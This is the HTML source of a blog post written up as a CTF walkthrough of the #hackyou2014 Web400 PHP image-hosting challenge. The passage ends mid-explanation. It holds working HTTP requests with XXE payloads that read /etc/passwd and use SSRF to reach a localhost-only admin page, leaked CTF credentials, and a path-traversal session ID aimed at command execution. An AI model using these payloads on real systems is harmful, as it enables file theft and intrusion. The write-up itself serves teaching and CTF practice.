@@ -1,0 +1,852 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>#hackyou2014 Web400 write-up</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="I did not solve this level during the CTF, but found it so interesting reading Xelenonz write-up that I couldnt help trying it myself just for the fun and since this blog is my personal notes, I decided to write it here for future reference, but all credits go to Xelenonz.
+We are given the code of a Image hostig web app. Reading the code we see how it handle the requests:">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="#hackyou2014 Web400 write-up">
+    <meta name="twitter:description" content="I did not solve this level during the CTF, but found it so interesting reading Xelenonz write-up that I couldnt help trying it myself just for the fun and since this blog is my personal notes, I decided to write it here for future reference, but all credits go to Xelenonz.
+We are given the code of a Image hostig web app. Reading the code we see how it handle the requests:">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="#hackyou2014 Web400 write-up">
+  <meta property="og:description" content="I did not solve this level during the CTF, but found it so interesting reading Xelenonz write-up that I couldnt help trying it myself just for the fun and since this blog is my personal notes, I decided to write it here for future reference, but all credits go to Xelenonz.
+We are given the code of a Image hostig web app. Reading the code we see how it handle the requests:">
+  <meta property="og:url" content="http://pwntester.com/blog/2014/01/17/hackyou2014-web400-write-up/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2014/01/17/hackyou2014-web400-write-up/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">#hackyou2014 Web400 write-up</h1>
+      <p class="post-meta">@pwntester · Jan 17, 2014 · 10 min read</p>
+    </header>
+    <article class="post-content"><p>I did not solve this <a href="http://hackyou2014tasks.ctf.su:40080/">level</a> during the CTF, but found it so interesting reading <a href="https://twitter.com/Xelenonz">Xelenonz</a> <a href="http://blog.rop.sh/hackyou2014-phpwning-web400/">write-up</a> that I couldnt help trying it myself just for the fun and since this blog is my personal notes, I decided to write it here for future reference, but all credits go to <a href="https://twitter.com/Xelenonz">Xelenonz</a>.</p>
+
+<p>We are given the <a href="http://hackyou.ctf.su/files/web400.zip">code</a> of a Image hostig web app. Reading the code we see how it handle the requests:</p>
+
+<pre><code class="language-lang-php">include 'config.php';
+include 'classes.php';
+$action = (isset($_REQUEST['action'])) ? $_REQUEST['action'] : 'View';
+$param = (isset($_REQUEST['param'])) ? $_REQUEST['param'] : 'index';
+$page = new $action($param);
+echo $page;
+</code></pre>
+
+<p>So <strong>action</strong> is used to instantiate any arbitrary class and <strong>param</strong> is the argument for the constructor. Cool. We are given a bunch of classes the application uses to upload and view images and to manage the Session object:</p>
+
+<pre><code class="language-lang-php">class View {
+    function __construct($page) {
+        ob_start();
+        readfile('html/header.html');
+        switch ($page) {
+            case 'index':
+                readfile('html/index.tpl.html');
+                break;
+            case 'upload':
+                readfile('html/upload.tpl.html');
+                break;
+        }
+        readfile('html/footer.html');
+    }
+    function __toString() {
+        $this-&gt;content = ob_get_contents();
+        ob_end_clean();
+        return $this-&gt;content;
+    }
+}
+
+class Upload {
+    function __construct($data) {
+        global $config;
+        $this-&gt;data = base64_decode($data);
+        $this-&gt;filename = md5(uniqid(rand(), true));
+        $this-&gt;path = $config['root'].'images/'.$this-&gt;filename;
+        file_put_contents($this-&gt;path, $this-&gt;data);
+        $this-&gt;type = exif_imagetype($this-&gt;path);
+    }
+    function __toString() {
+        if ($this-&gt;type) {
+            $link = 'http://'.$_SERVER['SERVER_NAME'].'/'.$this-&gt;filename;
+            return '&lt;p&gt;Successfully updated!&lt;/p&gt;Your link: &lt;a href=&quot;'.$link.'&quot;&gt;'.$link.'&lt;/a&gt;';
+        } else {
+            return '&lt;p&gt;Wrong file type!&lt;p&gt;';
+        }
+    }
+    function __destruct() {
+        if ($this-&gt;type) {
+            echo '&lt;p&gt;Some file info:&lt;pre&gt;';
+            passthru('exiv2 '.$this-&gt;path);
+            echo '&lt;/pre&gt;&lt;/p&gt;';
+        } else {
+            unlink($this-&gt;path);
+        }
+    }
+}
+
+class Image {
+    function __construct($filename) {
+        global $config;
+        $this-&gt;filename = $filename;
+        $this-&gt;path = $config['root'].'images/'.$this-&gt;filename;
+    }
+    function __toString() {
+        if (preg_match('/^[a-f0-9]{32}$/', $this-&gt;filename) &amp;&amp; file_exists($this-&gt;path)) {
+            $this-&gt;type = exif_imagetype($this-&gt;path);
+            $this-&gt;mime = image_type_to_mime_type($this-&gt;type);
+            header('Content-Type: '.$this-&gt;mime);
+            return file_get_contents($this-&gt;path);
+        } else {
+            return '&lt;h1&gt;Error&lt;/h1&gt;';
+        }
+    }
+}
+
+class Session {
+    function __construct() {
+        global $config;
+        session_set_save_handler(
+            array($this, &quot;open&quot;), array($this, &quot;close&quot;),  array($this, &quot;read&quot;),
+            array($this, &quot;write&quot;),array($this, &quot;destroy&quot;),array($this, &quot;gc&quot;)
+        );
+        $this-&gt;key = $config['key'];
+        $this-&gt;size = 32;
+        $this-&gt;path = '/tmp';
+    }
+
+    function encrypt($data) {
+        $iv = mcrypt_create_iv($this-&gt;size, MCRYPT_RAND);
+        $key = hash('sha256', $this-&gt;key, true);
+        $data = $iv.mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);
+        return $data;
+    }
+
+    function decrypt($data) {
+        $key = hash('sha256', $this-&gt;key, true);
+        $iv = substr($data, 0, $this-&gt;size);
+        $data = substr($data, $this-&gt;size);
+        $data = mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);
+        return $data;
+    }
+
+    function write($id, $data) {
+        $path = $this-&gt;path.'/'.$id;
+        $data = $this-&gt;encrypt($data);
+        file_put_contents($path, $data);
+    }
+
+    function read($id) {
+        $path = $this-&gt;path.'/'.$id;
+        $data = null;
+        if (is_file($path)) {
+            $data = file_get_contents($path);
+            $data = $this-&gt;decrypt($data);
+        }
+        return $data;
+    }
+
+    function open($sess_path, $sess_id) {
+        //nothing
+    }
+
+    function close() {
+        return true;
+    }
+
+    function gc($maxlifetime) {
+        $path = $this-&gt;path.'/*';
+        foreach (glob($path) as $file) {
+            if (filemtime($file) + $maxlifetime &lt; time() &amp;&amp; file_exists($file)) {
+                unlink($file);
+            }
+        }
+        return true;
+    }
+
+    function destroy($id) {
+        $path = $this-&gt;path.'/'.$id;
+        if (is_file($path)) {
+            unlink($path);
+        }
+        return true;
+    }
+}
+</code></pre>
+
+<p>The most interesting one are the <strong>Upload</strong> class whose destructor runs &ldquo;arbitrary code&rdquo; and <strong>Session</strong> which tell us how the Session object is initializated and stored/read from disk (although, we dont know the encryption key that is stored in the config.php file). These are classes are interesting but not useful if we can only create an instance and print the instance tostring return value. Lets look for PHP system classes that could be more useful:</p>
+
+<pre><code class="language-lang-bash">alvaro@winterfell ~&gt; php -r 'var_dump (get_declared_classes ());'
+array(139) {
+  [0]=&gt; string(8) &quot;stdClass&quot;
+  [1]=&gt; string(9) &quot;Exception&quot;
+  [2]=&gt; string(14) &quot;ErrorException&quot;
+  [3]=&gt; string(7) &quot;Closure&quot;
+  [4]=&gt; string(8) &quot;DateTime&quot;
+  [5]=&gt; string(12) &quot;DateTimeZone&quot;
+  [6]=&gt; string(12) &quot;DateInterval&quot;
+  [7]=&gt; string(10) &quot;DatePeriod&quot;
+  [8]=&gt; string(11) &quot;LibXMLError&quot;
+  [9]=&gt; string(7) &quot;SQLite3&quot;
+  [10]=&gt; string(11) &quot;SQLite3Stmt&quot;
+  [11]=&gt; string(13) &quot;SQLite3Result&quot;
+  [12]=&gt; string(12) &quot;DOMException&quot;
+  [13]=&gt; string(13) &quot;DOMStringList&quot;
+  [14]=&gt; string(11) &quot;DOMNameList&quot;
+  [15]=&gt; string(21) &quot;DOMImplementationList&quot;
+  [16]=&gt; string(23) &quot;DOMImplementationSource&quot;
+  [17]=&gt; string(17) &quot;DOMImplementation&quot;
+  [18]=&gt; string(7) &quot;DOMNode&quot;
+  [19]=&gt; string(16) &quot;DOMNameSpaceNode&quot;
+  [20]=&gt; string(19) &quot;DOMDocumentFragment&quot;
+  [21]=&gt; string(11) &quot;DOMDocument&quot;
+  [22]=&gt; string(11) &quot;DOMNodeList&quot;
+  [23]=&gt; string(15) &quot;DOMNamedNodeMap&quot;
+  [24]=&gt; string(16) &quot;DOMCharacterData&quot;
+  [25]=&gt; string(7) &quot;DOMAttr&quot;
+  [26]=&gt; string(10) &quot;DOMElement&quot;
+  [27]=&gt; string(7) &quot;DOMText&quot;
+  [28]=&gt; string(10) &quot;DOMComment&quot;
+  [29]=&gt; string(11) &quot;DOMTypeinfo&quot;
+  [30]=&gt; string(18) &quot;DOMUserDataHandler&quot;
+  [31]=&gt; string(11) &quot;DOMDomError&quot;
+  [32]=&gt; string(15) &quot;DOMErrorHandler&quot;
+  [33]=&gt; string(10) &quot;DOMLocator&quot;
+  [34]=&gt; string(16) &quot;DOMConfiguration&quot;
+  [35]=&gt; string(15) &quot;DOMCdataSection&quot;
+  [36]=&gt; string(15) &quot;DOMDocumentType&quot;
+  [37]=&gt; string(11) &quot;DOMNotation&quot;
+  [38]=&gt; string(9) &quot;DOMEntity&quot;
+  [39]=&gt; string(18) &quot;DOMEntityReference&quot;
+  [40]=&gt; string(24) &quot;DOMProcessingInstruction&quot;
+  [41]=&gt; string(15) &quot;DOMStringExtend&quot;
+  [42]=&gt; string(8) &quot;DOMXPath&quot;
+  [43]=&gt; string(5) &quot;finfo&quot;
+  [44]=&gt; string(14) &quot;LogicException&quot;
+  [45]=&gt; string(24) &quot;BadFunctionCallException&quot;
+  [46]=&gt; string(22) &quot;BadMethodCallException&quot;
+  [47]=&gt; string(15) &quot;DomainException&quot;
+  [48]=&gt; string(24) &quot;InvalidArgumentException&quot;
+  [49]=&gt; string(15) &quot;LengthException&quot;
+  [50]=&gt; string(19) &quot;OutOfRangeException&quot;
+  [51]=&gt; string(16) &quot;RuntimeException&quot;
+  [52]=&gt; string(20) &quot;OutOfBoundsException&quot;
+  [53]=&gt; string(17) &quot;OverflowException&quot;
+  [54]=&gt; string(14) &quot;RangeException&quot;
+  [55]=&gt; string(18) &quot;UnderflowException&quot;
+  [56]=&gt; string(24) &quot;UnexpectedValueException&quot;
+  [57]=&gt; string(25) &quot;RecursiveIteratorIterator&quot;
+  [58]=&gt; string(16) &quot;IteratorIterator&quot;
+  [59]=&gt; string(14) &quot;FilterIterator&quot;
+  [60]=&gt; string(23) &quot;RecursiveFilterIterator&quot;
+  [61]=&gt; string(22) &quot;CallbackFilterIterator&quot;
+  [62]=&gt; string(31) &quot;RecursiveCallbackFilterIterator&quot;
+  [63]=&gt; string(14) &quot;ParentIterator&quot;
+  [64]=&gt; string(13) &quot;LimitIterator&quot;
+  [65]=&gt; string(15) &quot;CachingIterator&quot;
+  [66]=&gt; string(24) &quot;RecursiveCachingIterator&quot;
+  [67]=&gt; string(16) &quot;NoRewindIterator&quot;
+  [68]=&gt; string(14) &quot;AppendIterator&quot;
+  [69]=&gt; string(16) &quot;InfiniteIterator&quot;
+  [70]=&gt; string(13) &quot;RegexIterator&quot;
+  [71]=&gt; string(22) &quot;RecursiveRegexIterator&quot;
+  [72]=&gt; string(13) &quot;EmptyIterator&quot;
+  [73]=&gt; string(21) &quot;RecursiveTreeIterator&quot;
+  [74]=&gt; string(11) &quot;ArrayObject&quot;
+  [75]=&gt; string(13) &quot;ArrayIterator&quot;
+  [76]=&gt; string(22) &quot;RecursiveArrayIterator&quot;
+  [77]=&gt; string(11) &quot;SplFileInfo&quot;
+  [78]=&gt; string(17) &quot;DirectoryIterator&quot;
+  [79]=&gt; string(18) &quot;FilesystemIterator&quot;
+  [80]=&gt; string(26) &quot;RecursiveDirectoryIterator&quot;
+  [81]=&gt; string(12) &quot;GlobIterator&quot;
+  [82]=&gt; string(13) &quot;SplFileObject&quot;
+  [83]=&gt; string(17) &quot;SplTempFileObject&quot;
+  [84]=&gt; string(19) &quot;SplDoublyLinkedList&quot;
+  [85]=&gt; string(8) &quot;SplQueue&quot;
+  [86]=&gt; string(8) &quot;SplStack&quot;
+  [87]=&gt; string(7) &quot;SplHeap&quot;
+  [88]=&gt; string(10) &quot;SplMinHeap&quot;
+  [89]=&gt; string(10) &quot;SplMaxHeap&quot;
+  [90]=&gt; string(16) &quot;SplPriorityQueue&quot;
+  [91]=&gt; string(13) &quot;SplFixedArray&quot;
+  [92]=&gt; string(16) &quot;SplObjectStorage&quot;
+  [93]=&gt; string(16) &quot;MultipleIterator&quot;
+  [94]=&gt; string(14) &quot;SessionHandler&quot;
+  [95]=&gt; string(22) &quot;__PHP_Incomplete_Class&quot;
+  [96]=&gt; string(15) &quot;php_user_filter&quot;
+  [97]=&gt; string(9) &quot;Directory&quot;
+  [98]=&gt; string(20) &quot;mysqli_sql_exception&quot;
+  [99]=&gt; string(13) &quot;mysqli_driver&quot;
+  [100]=&gt; string(6) &quot;mysqli&quot;
+  [101]=&gt; string(14) &quot;mysqli_warning&quot;
+  [102]=&gt; string(13) &quot;mysqli_result&quot;
+  [103]=&gt; string(11) &quot;mysqli_stmt&quot;
+  [104]=&gt; string(12) &quot;PDOException&quot;
+  [105]=&gt; string(3) &quot;PDO&quot;
+  [106]=&gt; string(12) &quot;PDOStatement&quot;
+  [107]=&gt; string(6) &quot;PDORow&quot;
+  [108]=&gt; string(13) &quot;PharException&quot;
+  [109]=&gt; string(4) &quot;Phar&quot;
+  [110]=&gt; string(8) &quot;PharData&quot;
+  [111]=&gt; string(12) &quot;PharFileInfo&quot;
+  [112]=&gt; string(19) &quot;ReflectionException&quot;
+  [113]=&gt; string(10) &quot;Reflection&quot;
+  [114]=&gt; string(26) &quot;ReflectionFunctionAbstract&quot;
+  [115]=&gt; string(18) &quot;ReflectionFunction&quot;
+  [116]=&gt; string(19) &quot;ReflectionParameter&quot;
+  [117]=&gt; string(16) &quot;ReflectionMethod&quot;
+  [118]=&gt; string(15) &quot;ReflectionClass&quot;
+  [119]=&gt; string(16) &quot;ReflectionObject&quot;
+  [120]=&gt; string(18) &quot;ReflectionProperty&quot;
+  [121]=&gt; string(19) &quot;ReflectionExtension&quot;
+  [122]=&gt; string(23) &quot;ReflectionZendExtension&quot;
+  [123]=&gt; string(16) &quot;SimpleXMLElement&quot;
+  [124]=&gt; string(17) &quot;SimpleXMLIterator&quot;
+  [125]=&gt; string(4) &quot;SNMP&quot;
+  [126]=&gt; string(13) &quot;SNMPException&quot;
+  [127]=&gt; string(10) &quot;SoapClient&quot;
+  [128]=&gt; string(7) &quot;SoapVar&quot;
+  [129]=&gt; string(10) &quot;SoapServer&quot;
+  [130]=&gt; string(9) &quot;SoapFault&quot;
+  [131]=&gt; string(9) &quot;SoapParam&quot;
+  [132]=&gt; string(10) &quot;SoapHeader&quot;
+  [133]=&gt; string(4) &quot;tidy&quot;
+  [134]=&gt; string(8) &quot;tidyNode&quot;
+  [135]=&gt; string(9) &quot;XMLReader&quot;
+  [136]=&gt; string(9) &quot;XMLWriter&quot;
+  [137]=&gt; string(13) &quot;XSLTProcessor&quot;
+  [138]=&gt; string(10) &quot;ZipArchive&quot;
+}
+</code></pre>
+
+<p>That&rsquo;s a bunch of classes but going through them we find two that are particulary interest: &ldquo;SplFileObject&rdquo; and &ldquo;SimpleXmlElement&rdquo;.
+With SplFileObject we are returned the first line of any file:</p>
+
+<p><img src="/images/octopress/web400-0.png" alt="" /></p>
+
+<p>You can however, use PHP filters to encode it base64 and get all file contents as a long base64 line:</p>
+
+<p><img src="/images/octopress/web400-1.png" alt="" /></p>
+
+<p>Thats pretty cool, now we can decode it and get the key:</p>
+
+<pre><code class="language-lang-php">$config = array();
+$config['root'] = '/var/www/';
+$config['key'] = '6hQJMFh8gRje67EmpDX3';
+$config['IP'] = array('127.0.0.1');
+$config['password'] = '3fd5b6db6bc90ddd6a6f6caad27d8b00';
+</code></pre>
+
+<p>And thats basically as far as I got, I could not bypass the restriction in the &ldquo;admin.php&rdquo; to allow only requests from localhost so I could not start the session and try to take advantage of it.</p>
+
+<p>After the CTF ended I found out that we could submit XML documents with external entities and launch a SSRF attack from there. Lets see how.
+We can use the &ldquo;SimpleXMLElement&rdquo; class to create XML documents like:</p>
+
+<pre><code class="language-lang-bash">POST /index.php?action=SimpleXMLElement HTTP/1.1
+Host: hackyou2014tasks.ctf.su:40080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0
+Content-Type: application/x-www-form-urlencoded;application/xml
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,es-es;q=0.8,es;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Length: 21
+
+param=&lt;foo&gt;test&lt;/foo&gt;
+</code></pre>
+
+<p><img src="/images/octopress/web400-2.png" alt="" /></p>
+
+<p>Actually I tried this during the CTF but forgot to add the &ldquo;Content-Type&rdquo; header so kept on getting &ldquo;Internal Server Errors&rdquo;, damn!</p>
+
+<p>Anyway, The server returns us our XML document so now we can try to inject external entities:</p>
+
+<pre><code class="language-lang-bash">POST /index.php?action=SimpleXMLElement HTTP/1.1
+Host: hackyou2014tasks.ctf.su:40080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0
+Content-Type: application/x-www-form-urlencoded;application/xml
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,es-es;q=0.8,es;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Length: 76
+
+param=&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;/etc/passwd&quot; &gt;]&gt;&lt;foo&gt;%26xxe;&lt;/foo&gt;
+</code></pre>
+
+<pre><code class="language-lang-bash">HTTP/1.1 200 OK
+Date: Fri, 17 Jan 2014 13:49:12 GMT
+Server: Apache/2.2.22 (Ubuntu)
+X-Powered-By: PHP/5.3.10-1ubuntu3.8
+Vary: Accept-Encoding
+Content-Length: 1041
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+messagebus:x:102:105::/var/run/dbus:/bin/false
+whoopsie:x:103:106::/nonexistent:/bin/false
+landscape:x:104:109::/var/lib/landscape:/bin/false
+sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000:user,,,:/home/user:/bin/bash
+</code></pre>
+
+<p>The nice thing about this XXE vulnerability is not that we can read any file (that we already could using the SplFileObject class) but that we can use to initiate requests from the own server!</p>
+
+<p>Now we can bypass localhost address restriction, however accessing <a href="http://locahost/admin.php">http://locahost/admin.php</a> returns some characters that break the XML schema so we will use the PHP base64 encoder filter to return an XML schema friendly version of the page:</p>
+
+<pre><code class="language-lang-bash">POST /index.php?action=SimpleXMLElement HTTP/1.1
+Host: hackyou2014tasks.ctf.su:40080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0
+Content-Type: application/x-www-form-urlencoded;application/xml
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,es-es;q=0.8,es;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Length: 140
+
+param=&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://localhost/admin.php&quot; &gt;]&gt;&lt;foo&gt;%26xxe;&lt;/foo&gt;
+</code></pre>
+
+<pre><code class="language-lang-bash">HTTP/1.1 200 OK
+Date: Fri, 17 Jan 2014 13:51:57 GMT
+Server: Apache/2.2.22 (Ubuntu)
+X-Powered-By: PHP/5.3.10-1ubuntu3.8
+Vary: Accept-Encoding
+Content-Length: 256
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+
+PGh0bWw+Cjxib2R5PgoJPGI+RW50ZXIgcGFzc3dvcmQ6PC9iPgoJPGZvcm0gYWN0aW9uPSJhZG1pbi5waHAiIG1ldGhvZD0iUE9TVCI+CgkJPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InBhc3N3b3JkIj4KCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJHTyI+Cgk8L2Zvcm0+CjwvYm9keT4KPC9odG1sPgo=
+</code></pre>
+
+<p>That decodes into:</p>
+
+<pre><code class="language-lang-html">&lt;html&gt;
+&lt;body&gt;
+    &lt;b&gt;Enter password:&lt;/b&gt;
+    &lt;form action=&quot;admin.php&quot; method=&quot;POST&quot;&gt;
+        &lt;input type=&quot;text&quot; name=&quot;password&quot;&gt;
+        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;GO&quot;&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>Now, I dont really need to become admin since right after the local IP check, the Session is initialized:</p>
+
+<pre><code class="language-lang-php">if (!in_array($_SERVER['REMOTE_ADDR'], $config['IP']))
+    die('&lt;h1&gt;Access denied&lt;/h1&gt;');
+
+$handler = new Session();
+session_start();
+</code></pre>
+
+<p>So <strong>session_start()</strong> will call the session handler <strong>open()</strong> and <strong>read()</strong> methods to restore the session. If we look at our custom Session handler we see that the serialized session is read from /tmp/&lt;phpsessionid&gt;:</p>
+
+<pre><code class="language-lang-php">function __construct() {
+    global $config;
+    session_set_save_handler(
+        array($this, &quot;open&quot;), array($this, &quot;close&quot;),  array($this, &quot;read&quot;),
+        array($this, &quot;write&quot;),array($this, &quot;destroy&quot;),array($this, &quot;gc&quot;)
+    );
+    $this-&gt;key = $config['key'];
+    $this-&gt;size = 32;
+    $this-&gt;path = '/tmp';
+}
+
+function read($id) {
+    $path = $this-&gt;path.'/'.$id;
+    $data = null;
+    if (is_file($path)) {
+        $data = file_get_contents($path);
+        $data = $this-&gt;decrypt($data);
+    }
+    return $data;
+}
+</code></pre>
+
+<p>And since we can control PHPSESSIONID by sending it as a query parameter using the SSRF attack, we can point the <strong>read()</strong> method to a different file. Luckly for us we can upload images to /var/www/images right?? so if we make:</p>
+
+<pre><code class="language-lang-bash">PHPSESSIONID=../var/www/images/&lt;image under control&gt;
+</code></pre>
+
+<p>We will fool the application to read the session from our file. All we have to do now is uploading an image that is an encrypted version of a serialized session containing any arbitrary objects we want to store there.</p>
+
+<p>Here its where the <strong>Upload</strong> class come really handy since its destructor can execute any command if we control the $this-path variable which we do:</p>
+
+<pre><code class="language-lang-php">class Upload {
+    function __construct($data) {
+        global $config;
+        $this-&gt;data = base64_decode($data);
+        $this-&gt;filename = md5(uniqid(rand(), true));
+        $this-&gt;path = $config['root'].'images/'.$this-&gt;filename;
+        file_put_contents($this-&gt;path, $this-&gt;data);
+        $this-&gt;type = exif_imagetype($this-&gt;path);
+    }
+    function __toString() {
+        if ($this-&gt;type) {
+            $link = 'http://'.$_SERVER['SERVER_NAME'].'/'.$this-&gt;filename;
+            return '&lt;p&gt;Successfully updated!&lt;/p&gt;Your link: &lt;a href=&quot;'.$link.'&quot;&gt;'.$link.'&lt;/a&gt;';
+        } else {
+            return '&lt;p&gt;Wrong file type!&lt;p&gt;';
+        }
+    }
+    function __destruct() {
+        if ($this-&gt;type) {
+            echo '&lt;p&gt;Some file info:&lt;pre&gt;';
+            passthru('exiv2 '.$this-&gt;path);
+            echo '&lt;/pre&gt;&lt;/p&gt;';
+        } else {
+            unlink($this-&gt;path);
+        }
+    }
+}
+</code></pre>
+
+<p>So we can craft a session object containing an instance of a hand crafted <strong>Upolad</strong>* class and assign it to $_SESSION<a href="so the welcome message is printed">&lsquo;auth&rsquo;</a>.</p>
+
